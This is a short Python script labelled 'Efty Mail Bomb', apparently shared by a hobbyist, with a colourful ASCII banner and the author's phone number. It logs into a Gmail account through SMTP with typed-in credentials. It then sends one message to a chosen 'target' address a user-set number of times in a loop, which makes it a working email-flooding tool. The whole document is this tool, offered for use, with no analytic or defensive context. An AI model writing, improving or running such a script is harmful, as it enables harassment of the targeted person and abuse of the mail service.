#@@Noob Coder Efty 
import smtplib
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"
logo=red+purple+str("""
   ______  __ _           __  __       _ _   ____                  _     
 |  ____|/ _| |         |  \/  |     (_) | |  _ \                | |    
 | |__  | |_| |_ _   _  | \  / | __ _ _| | | |_) | ___  _ __ ___ | |__  
 |  __| |  _| __| | | | | |\/| |/ _` | | | |  _ < / _ \| '_ ` _ \| '_ \ 
 | |____| | | |_| |_| | | |  | | (_| | | | | |_) | (_) | | | | | | |_) |
 |______|_|  \__|\__, | |_|  |_|\__,_|_|_| |____/ \___/|_| |_| |_|_.__/ 
                  __/ |                                                 
                 |___/ 
                 Made by Efty Forid
                 Contact:01580887275""")

print(logo)

efty=smtplib.SMTP('smtp.gmail.com','587')

efty.ehlo()
efty.starttls()
	      
email=str(input(" >+Enter your Email:"))
pwd=str(input("Enter Your Password:"))
tmail=str(input("Enter Your Target Gmail:"))
msg=str(input("Enter Your Message;"))
amount=int(input("Enter Your Amount:"))

efty.login(email,pwd)

for i in range(amount):
	efty.sendmail(email,tmail,msg)
	